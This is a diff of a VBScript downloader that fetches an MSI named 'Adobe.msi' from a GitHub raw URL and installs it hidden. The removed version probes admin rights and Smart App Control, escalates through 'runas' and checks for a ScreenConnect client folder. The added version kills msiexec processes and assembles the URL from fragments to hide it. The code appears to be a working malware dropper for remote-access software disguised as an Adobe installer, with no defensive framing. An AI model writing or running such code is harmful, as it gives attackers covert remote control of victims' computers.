@@ -1,276 +1,150 @@
-Dim fso, sh, temp, logFile, f, http, msiUrl, msiPath
+' ============================================================
+    '  MSI install block — full logging
+    ' ============================================================
 
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set sh  = CreateObject("WScript.Shell")
-temp = sh.ExpandEnvironmentStrings("%TEMP%")
-logFile = temp & "\diag.txt"
+    Dim diagFile, df
+    diagFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\msi_diag.txt"
+    Set df = fso.CreateTextFile(diagFile, True)
+    df.WriteLine "=== MSI INSTALL DIAG ==="
+    df.WriteLine "time     : " & Now
+    df.WriteLine "temp     : " & sh.ExpandEnvironmentStrings("%TEMP%")
+    df.WriteLine ""
 
-' open log
-Set f = fso.CreateTextFile(logFile, True)
-f.WriteLine "=================================================="
-f.WriteLine "DIAG LOG - START"
-f.WriteLine "=================================================="
-f.WriteLine "time      : " & Now
-f.WriteLine "user      : " & sh.ExpandEnvironmentStrings("%USERNAME%")
-f.WriteLine "computer  : " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-f.WriteLine "temp      : " & temp
-f.WriteLine "OS        : " & sh.ExpandEnvironmentStrings("%OS%")
-f.WriteLine ""
-
-' check admin via whoami
-f.WriteLine "--- ADMIN PROBE ---"
-Dim tmpOut, fIn, contents, isAdmin
-tmpOut = temp & "\_p.txt"
-sh.Run "%COMSPEC% /c whoami /groups > """ & tmpOut & """", 0, True
-If fso.FileExists(tmpOut) Then
-    Set fIn = fso.OpenTextFile(tmpOut, 1)
-    contents = fIn.ReadAll
-    fIn.Close
-    If InStr(contents, "S-1-16-12288") > 0 Then
-        isAdmin = True
+    ' ---- kill any zombie msiexec before install ----
+    df.WriteLine "--- STEP 1: KILL ZOMBIE MSIEXEC ---"
+    Dim msiKill, msiKillEntry, killCount
+    killCount = 0
+    On Error Resume Next
+    Set msiKill = wmi.ExecQuery("SELECT ProcessId,CommandLine FROM Win32_Process WHERE Name='msiexec.exe'")
+    If Err.Number <> 0 Then
+        df.WriteLine "wmi query err: " & Err.Number & " - " & Err.Description
+        Err.Clear
     Else
-        isAdmin = False
+        For Each msiKillEntry In msiKill
+            df.WriteLine "found msiexec pid=" & msiKillEntry.ProcessId
+            df.WriteLine "  cmdline: " & msiKillEntry.CommandLine
+            msiKillEntry.Terminate
+            If Err.Number <> 0 Then
+                df.WriteLine "  terminate err: " & Err.Number & " - " & Err.Description
+                Err.Clear
+            Else
+                df.WriteLine "  terminated ok"
+                killCount = killCount + 1
+            End If
+        Next
     End If
-    fso.DeleteFile tmpOut, True
-Else
-    f.WriteLine "whoami output NOT FOUND - cannot determine admin state"
-    isAdmin = False
-End If
-f.WriteLine "isAdmin   : " & isAdmin
-f.WriteLine ""
+    On Error GoTo 0
+    df.WriteLine "total killed: " & killCount
+    df.WriteLine ""
 
-' check Smart App Control
-f.WriteLine "--- SMART APP CONTROL CHECK ---"
-Dim sacKey, sacVal, sacRead
-On Error Resume Next
-sacRead = sh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy\VerifiedAndReputablePolicyState")
-If Err.Number = 0 Then
-    f.WriteLine "SmartAppControl registry value: " & sacRead
-Else
-    f.WriteLine "SmartAppControl registry value: NOT FOUND (err " & Err.Number & ")"
-    Err.Clear
-End If
-On Error GoTo 0
-f.WriteLine ""
-
-' check if msiexec exists
-f.WriteLine "--- MSIEXEC CHECK ---"
-Dim msiExe
-msiExe = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\msiexec.exe"
-If fso.FileExists(msiExe) Then
-    f.WriteLine "msiexec.exe found: " & msiExe
-Else
-    f.WriteLine "msiexec.exe NOT FOUND at " & msiExe
-End If
-f.WriteLine ""
-
-' check for existing Adobe.msi
-f.WriteLine "--- EXISTING MSI CHECK ---"
-msiPath = temp & "\Adobe.msi"
-If fso.FileExists(msiPath) Then
-    f.WriteLine "existing MSI found: " & msiPath
-    f.WriteLine "existing MSI size : " & fso.GetFile(msiPath).Size
-    fso.DeleteFile msiPath, True
-    f.WriteLine "existing MSI deleted"
-Else
-    f.WriteLine "no existing MSI - clean state"
-End If
-f.WriteLine ""
-
-' fetch MSI
-f.WriteLine "--- MSI FETCH ---"
-msiUrl = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
-f.WriteLine "url       : " & msiUrl
-
-On Error Resume Next
-Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-If Err.Number <> 0 Then
-    f.WriteLine "http object create err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-
-On Error Resume Next
-http.open "GET", msiUrl, False
-If Err.Number <> 0 Then
-    f.WriteLine "http.open err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-
-On Error Resume Next
-http.send
-If Err.Number <> 0 Then
-    f.WriteLine "http.send err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-
-f.WriteLine "http status: " & http.status
-f.WriteLine "http body len: " & LenB(http.responseBody) & " bytes"
-f.WriteLine ""
-
-If http.status = 200 Then
     On Error Resume Next
-    Dim stream
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.Write http.responseBody
-    stream.SaveToFile msiPath, 2
+    sh.Run "%COMSPEC% /c timeout /t 2 /nobreak >nul", 0, True
     If Err.Number <> 0 Then
-        f.WriteLine "stream save err: " & Err.Number & " - " & Err.Description
+        df.WriteLine "timeout err: " & Err.Number & " - " & Err.Description
         Err.Clear
     End If
-    stream.Close
     On Error GoTo 0
+    df.WriteLine "waited 2s for mutex release"
+    df.WriteLine ""
 
-    If fso.FileExists(msiPath) Then
-        f.WriteLine "MSI saved : " & msiPath
-        f.WriteLine "MSI size  : " & fso.GetFile(msiPath).Size
-    Else
-        f.WriteLine "MSI save FAILED"
-    End If
-End If
-f.WriteLine ""
+    ' ---- fetch MSI via WinHTTP ----
+    df.WriteLine "--- STEP 2: FETCH MSI ---"
+    Dim http, msiUrl, msiPath
+    msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
+    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
+    df.WriteLine "url      : " & msiUrl
+    df.WriteLine "dest     : " & msiPath
 
-' check MSI signature
-f.WriteLine "--- MSI SIGNATURE CHECK ---"
-On Error Resume Next
-Dim sigCheck
-sigCheck = sh.Run("powershell -NoP -Exec Bypass -Command ""$s = Get-AuthenticodeSignature '"" & msiPath & ""'; Write-Output ($s.Status.ToString() + '|' + $s.StatusMessage)"" > """ & temp & "\sig.txt"" 2>&1", 0, True)
-If fso.FileExists(temp & "\sig.txt") Then
-    Set fIn = fso.OpenTextFile(temp & "\sig.txt", 1)
-    f.WriteLine "sig output: " & fIn.ReadAll
-    fIn.Close
-    fso.DeleteFile temp & "\sig.txt", True
-End If
-Err.Clear
-On Error GoTo 0
-f.WriteLine ""
-
-' try shell association first
-f.WriteLine "--- ATTEMPT 1: SHELL ASSOCIATION ---"
-f.WriteLine "cmd: " & Chr(34) & msiPath & Chr(34)
-On Error Resume Next
-sh.Run Chr(34) & msiPath & Chr(34), 0, False
-If Err.Number <> 0 Then
-    f.WriteLine "shell run err: " & Err.Number & " - " & Err.Description
-    Err.Clear
-End If
-On Error GoTo 0
-
-sh.Run "%COMSPEC% /c timeout /t 8 /nobreak >nul", 0, True
-
-' check if msiexec running
-Dim wmi, procs, proc, running
-Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-Set procs = wmi.ExecQuery("SELECT ProcessId,CommandLine FROM Win32_Process WHERE Name='msiexec.exe'")
-running = False
-For Each proc In procs
-    f.WriteLine "msiexec found: pid=" & proc.ProcessId & " cmd=" & proc.CommandLine
-    running = True
-Next
-f.WriteLine "msiexec running after 8s: " & running
-f.WriteLine ""
-
-' if not running, try explicit msiexec
-If Not running Then
-    f.WriteLine "--- ATTEMPT 2: EXPLICIT MSIEXEC /qb ---"
-    Dim explicitCmd
-    explicitCmd = "msiexec.exe /i """ & msiPath & """ /qb /norestart"
-    f.WriteLine "cmd: " & explicitCmd
     On Error Resume Next
-    sh.Run explicitCmd, 0, False
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
     If Err.Number <> 0 Then
-        f.WriteLine "explicit run err: " & Err.Number & " - " & Err.Description
+        df.WriteLine "create obj err: " & Err.Number & " - " & Err.Description
         Err.Clear
     End If
     On Error GoTo 0
 
-    sh.Run "%COMSPEC% /c timeout /t 10 /nobreak >nul", 0, True
-
-    ' check again
-    Set procs = wmi.ExecQuery("SELECT ProcessId,CommandLine FROM Win32_Process WHERE Name='msiexec.exe'")
-    running = False
-    For Each proc In procs
-        f.WriteLine "msiexec found: pid=" & proc.ProcessId & " cmd=" & proc.CommandLine
-        running = True
-    Next
-    f.WriteLine "msiexec running after explicit: " & running
-    f.WriteLine ""
-End If
-
-' if still not running, try ShellExecute runas
-If Not running Then
-    f.WriteLine "--- ATTEMPT 3: SHELLEXECUTE RUNAS ---"
-    f.WriteLine "cmd: msiexec /i ... /qf"
     On Error Resume Next
-    CreateObject("Shell.Application").ShellExecute "msiexec.exe", "/i """ & msiPath & """ /qf /norestart", "", "runas", 0
+    http.Open "GET", msiUrl, False
     If Err.Number <> 0 Then
-        f.WriteLine "ShellExecute err: " & Err.Number & " - " & Err.Description
+        df.WriteLine "http.open err: " & Err.Number & " - " & Err.Description
         Err.Clear
     End If
     On Error GoTo 0
 
-    sh.Run "%COMSPEC% /c timeout /t 15 /nobreak >nul", 0, True
-
-    Set procs = wmi.ExecQuery("SELECT ProcessId,CommandLine FROM Win32_Process WHERE Name='msiexec.exe'")
-    running = False
-    For Each proc In procs
-        f.WriteLine "msiexec found: pid=" & proc.ProcessId & " cmd=" & proc.CommandLine
-        running = True
-    Next
-    f.WriteLine "msiexec running after ShellExecute: " & running
-    f.WriteLine ""
-End If
-
-' check ScreenConnect install folder
-f.WriteLine "--- SCREENCONNECT INSTALL CHECK ---"
-Dim scPath1, scPath2
-scPath1 = "C:\Program Files (x86)\ScreenConnect Client"
-scPath2 = "C:\Program Files\ScreenConnect Client"
-If fso.FolderExists(scPath1) Then
-    f.WriteLine "found: " & scPath1
-ElseIf fso.FolderExists(scPath2) Then
-    f.WriteLine "found: " & scPath2
-Else
-    f.WriteLine "no ScreenConnect Client folder found"
-    ' enumerate any ScreenConnect* folders
-    Dim shExec
     On Error Resume Next
-    shExec = sh.Run("%COMSPEC% /c dir /b /ad ""C:\Program Files (x86)\ScreenConnect*"" > """ & temp & "\scdirs.txt"" 2>&1", 0, True)
-    If fso.FileExists(temp & "\scdirs.txt") Then
-        Set fIn = fso.OpenTextFile(temp & "\scdirs.txt", 1)
-        f.WriteLine "dir listing: " & fIn.ReadAll
-        fIn.Close
-        fso.DeleteFile temp & "\scdirs.txt", True
+    http.Send
+    If Err.Number <> 0 Then
+        df.WriteLine "http.send err: " & Err.Number & " - " & Err.Description
+        Err.Clear
     End If
-    shExec = sh.Run("%COMSPEC% /c dir /b /ad ""C:\Program Files\ScreenConnect*"" >> """ & temp & "\scdirs.txt"" 2>&1", 0, True)
-    If fso.FileExists(temp & "\scdirs.txt") Then
-        Set fIn = fso.OpenTextFile(temp & "\scdirs.txt", 1)
-        f.WriteLine "dir listing: " & fIn.ReadAll
-        fIn.Close
-        fso.DeleteFile temp & "\scdirs.txt", True
-    End If
-    Err.Clear
     On Error GoTo 0
-End If
-f.WriteLine ""
 
-' check windows installer service
-f.WriteLine "--- WINDOWS INSTALLER SERVICE ---"
-Dim svcQuery, svcProc
-Set svcQuery = wmi.ExecQuery("SELECT Name,State,StartMode FROM Win32_Service WHERE Name='msiserver'")
-For Each svcProc In svcQuery
-    f.WriteLine "msiserver: State=" & svcProc.State & " StartMode=" & svcProc.StartMode
-Next
-f.WriteLine ""
+    df.WriteLine "http status : " & http.Status
+    df.WriteLine "body len    : " & LenB(http.ResponseBody) & " bytes"
+    df.WriteLine ""
 
-f.WriteLine "=================================================="
-f.WriteLine "DIAG LOG - END"
-f.WriteLine "=================================================="
-f.Close
+    If http.Status = 200 Then
+        df.WriteLine "--- STEP 3: SAVE MSI ---"
+        Dim stream, saveErr
+        saveErr = ""
+        On Error Resume Next
+        Set stream = CreateObject("ADODB.Stream")
+        If Err.Number <> 0 Then
+            saveErr = "create stream: " & Err.Number & " - " & Err.Description
+            Err.Clear
+        End If
+        If saveErr = "" Then
+            stream.Type = 1
+            stream.Open
+            stream.Write http.ResponseBody
+            stream.SaveToFile msiPath, 2
+            If Err.Number <> 0 Then
+                saveErr = "save: " & Err.Number & " - " & Err.Description
+                Err.Clear
+            End If
+            stream.Close
+        End If
+        On Error GoTo 0
+        df.WriteLine "save err  : " & saveErr
 
-' show log
-sh.Run "notepad.exe """ & logFile & """", 1, False
+        If fso.FileExists(msiPath) Then
+            df.WriteLine "saved ok  : " & msiPath
+            df.WriteLine "saved size: " & fso.GetFile(msiPath).Size
+        Else
+            df.WriteLine "save FAILED - file not on disk"
+        End If
+        df.WriteLine ""
+
+        ' ---- run via shell association ----
+        df.WriteLine "--- STEP 4: LAUNCH INSTALL ---"
+        Dim launchCmd
+        launchCmd = Chr(34) & msiPath & Chr(34)
+        df.WriteLine "cmd       : " & launchCmd
+
+        On Error Resume Next
+        sh.Run launchCmd, 0, False
+        If Err.Number <> 0 Then
+            df.WriteLine "shell run err: " & Err.Number & " - " & Err.Description
+            Err.Clear
+        Else
+            df.WriteLine "shell run returned cleanly"
+        End If
+        On Error GoTo 0
+
+        df.WriteLine "waiting 10s for msiexec spawn..."
+        sh.Run "%COMSPEC% /c timeout /t 10 /nobreak >nul", 0, True
+
+        Dim checkProcs, checkProc, runningNow
+        runningNow = 0
+        Set checkProcs = wmi.ExecQuery("SELECT ProcessId,CommandLine FROM Win32_Process WHERE Name='msiexec.exe'")
+        For Each checkProc In checkProcs
+            df.WriteLine "msiexec running: pid=" & checkProc.ProcessId
+            df.WriteLine "  cmd: " & checkProc.CommandLine
+            runningNow = runningNow + 1
+        Next
+        df.WriteLine "total msiexec after launch: " & runningNow
+        df.WriteLine ""
+    End If
+
+    df.WriteLine "=== END ==="
+    df.Close
